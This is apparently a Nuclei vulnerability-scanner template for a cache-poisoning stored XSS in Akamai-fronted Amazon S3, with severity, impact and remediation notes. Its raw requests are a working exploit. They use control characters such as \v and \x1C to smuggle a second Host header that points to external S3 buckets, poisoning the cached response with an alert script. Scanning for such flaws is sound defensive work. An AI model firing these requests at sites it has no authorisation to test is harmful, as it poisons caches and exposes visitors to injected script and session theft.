id: akamai-s3-cache-poisoning
info:
  name: Akamai/Amazon S3 - Cache Poisoning
  author: DhiyaneshDk
  severity: high
  description: Akamai/Amazon S3 expose a stored cross-site scripting vulnerability
    generated by cache poisoning capability. An attacker can inject arbitrary script
    in the browser of an unsuspecting user in the context of the affected site, which
    can further allow the attacker to steal cookie-based authentication credentials
    and launch other attacks.
  reference:
  - https://web.archive.org/web/20230101082612/https://spyclub.tech/2022/12/14/unusual-cache-poisoning-akamai-s3/
  - https://owasp.org/www-community/attacks/Cache_Poisoning
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L
    cvss-score: 7.1
    cwe-id: CWE-44
  metadata:
    verified: true
    max-request: 204
  tags: cache,poisoning,xss,akamai,s3,misconfig
  impact: '- Injection of arbitrary script into the victim''s browser, allowing the
    attacker to execute code in the context of the affected site

    - Theft of cookie-based authentication credentials, enabling the attacker to impersonate
    the legitimate user

    - Potential for further attacks, such as credential stuffing, phishing, and data
    exfiltration, leveraging the compromised user account

    - Compromise of the user''s session and access to sensitive data or functionality
    within the affected application

    - Abuse of the cached content to distribute malware or conduct other malicious
    activities targeting the site''s visitors'
  remediation: 'To address the Akamai/Amazon S3 cache poisoning vulnerability, it
    is essential to implement a comprehensive solution that mitigates the risk of
    arbitrary script injection and unauthorized access to sensitive data. The following
    steps should be taken:


    - Ensure proper input validation and sanitization on all user-supplied data, including
    any parameters or headers that may be cached by the CDN or S3 service. This will
    prevent the injection of malicious scripts into the cached content.

    - Implement robust content security policies (CSP) and other security headers,
    such as X-XSS-Protection and X-Frame-Options, to further restrict the execution
    of unauthorized scripts within the user''s browser.

    - Regularly review and audit the caching configuration on the CDN and S3 service
    to ensure that sensitive or dynamic content is not being cached in a way that
    could be exploited by an attacker.

    - Consider the use of a Web Application Firewall (WAF) or other security solutions
    that can detect and block attempts to poison the cache or inject malicious scripts.

    - Educate developers on the risks of cache poisoning and the importance of secure
    coding practices, including proper input validation and the use of security headers.'
variables:
  rand: '{{rand_base(5)}}'
http:
- raw:
  - 'GET /nuclei.svg?{{rand}}=x HTTP/1.1

    Host: {{Hostname}}

    {{escape}}Host: {{bucket}}


    '
  - 'GET /nuclei.svg?{{rand}}=x HTTP/1.1

    Host: {{Hostname}}


    '
  attack: clusterbomb
  payloads:
    escape:
    - "\v"
    - "\f"
    - "\x1C"
    - "\x1D"
    - "\x1E"
    - "\x1F"
    bucket:
    - nuclei-ap-northeast-1
    - nuclei-ap-northeast-2
    - nuclei-ap-northeast-3
    - nuclei-ap-south-1
    - nuclei-ap-southeast-1
    - nuclei-ap-southeast-2
    - nuclei-ca-central-1
    - nuclei-eu-central-1
    - nuclei-eu-north-1
    - nuclei-eu-west-1
    - nuclei-eu-west-2
    - nuclei-eu-west-3
    - nuclei-sa-east-1
    - nuclei-us-east-1
    - nuclei-us-east-2
    - nuclei-us-west-1
    - nuclei-us-west-2
  stop-at-first-match: true
  unsafe: true
  matchers:
  - type: dsl
    dsl:
    - contains(body_2, "alert(document.domain)")
    - status_code_2 == 200
    condition: and
